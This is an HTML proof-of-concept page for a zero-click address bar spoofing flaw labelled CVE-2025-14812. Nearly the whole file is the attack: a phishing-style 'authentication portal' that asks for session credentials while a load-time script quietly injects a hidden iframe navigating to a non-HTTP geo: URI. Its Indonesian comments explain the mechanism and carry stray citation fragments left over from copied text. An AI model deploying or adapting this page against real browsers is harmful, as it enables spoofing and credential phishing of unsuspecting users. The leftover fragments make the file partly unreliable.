<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>CVE-2025-14812: Zero-Click Address Bar Spoofing PoC</title>
    <style>
      body {
        margin: 0;
        padding: 0;
        background: #ffffff;
        color: #1d1d1f;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        display: flex;
        align-items: center;
        justify-content: center;
        height: 100vh;
        text-align: center;
      }
      .container {
        padding: 20px;
        max-width: 600px;
      }
      h1 {
        font-size: 36px;
        color: #d70015;
        margin-bottom: 10px;
        font-weight: 700;
      }
      p {
        font-size: 18px;
        color: #0066cc;
        font-weight: 500;
      }
      .info {
        margin-top: 20px;
        font-size: 12px;
        color: #8b949e;
        font-family: monospace;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <h1>AUTHENTICATION PORTAL</h1>
      <p>Please verify your session credentials below.</p>
      <div class="info" id="statusLog">Status: Initializing zero-click context test...</div>
    </div>

    <script>
      // Logika inti berdasarkan mekanisme CVE-2025-14812:
      // Iframe otomatis memicu navigasi URI scheme pada page load tanpa interaksi pengguna[span_2](start_span)[span_2](end_span).
      let triggerContextSpoof = function() {
        let subframe = document.createElement("iframe");
        subframe.style.display = "none";
        
        // Memanfaatkan skema URI non-HTTP (seperti geo:) untuk menguji delegate misattribution pada mobile browser[span_3](start_span)[span_3](end_span)
        subframe.src = "geo:0,0?q=attacker_controlled_context";
        
        document.body.appendChild(subframe);
        
        let statusLog = document.getElementById("statusLog");
        if (statusLog) {
          statusLog.innerText = "Status: Subframe URI-scheme navigation dispatched.";
        }
      };

      // Eksekusi otomatis begitu halaman dimuat (Zero-Click behavior)[span_4](start_span)[span_4](end_span)
      window.onload = function() {
        setTimeout(triggerContextSpoof, 400);
      };
    </script>
  </body>
</html>
